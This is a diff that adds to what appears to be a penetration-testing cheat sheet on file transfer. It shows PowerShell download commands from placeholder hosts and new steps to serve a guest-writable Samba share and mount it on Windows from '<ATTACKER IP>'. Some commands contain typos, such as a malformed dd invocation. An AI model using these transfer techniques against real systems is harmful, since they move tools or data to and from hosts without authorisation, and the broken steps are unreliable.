@@ -119,3 +119,34 @@ Import-Module bitstransfer; Start-BitsTransfer -Source "<URL>" -Destination "<ou
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
 Invoke-WebRequest http://<IP>:<PORT>/<file> -UserAgent $UserAgent -OutFile "<outfile>"
 ```
+
+## Create a SMB share on linux with a NFS block fs, mount it on windows
+```
+# 1. Create NFS block fs of size2GB
+dd if /dev/zero of=NTFS.DISK bs=1024M count=2
+
+# 2. Mount on loopback device
+losetup -fP NTFS.DISK # -f: find first unused device, -P : create a partitioned loop device
+
+# 3. Format the block to the desired fs
+sudo mkfs.ntfs /dev/loop<NUMBER>
+
+# 4. Mount the fs
+sudo mount /dev/loop<NUMBER> <YOUR MOUNTPOINT>
+
+# 5. Edit the smbd daemon conf, add a share by adding the following lines
+# /etc/samba/smb.conf
+[<SHARE NAME>]
+  comment = foo
+  path = <YOUR MOUNTPOINT>
+  browseable = yes
+  read only = no
+  guest ok = yes
+
+# 6. Restart sbmd.service
+sudo systemctl restart smbd
+
+# 7. Mount smb share from Windows on the X: share
+net use x: \\<ATTACKER IP>\<SHARE NAME>
+net use x: /delete # to delete
+```
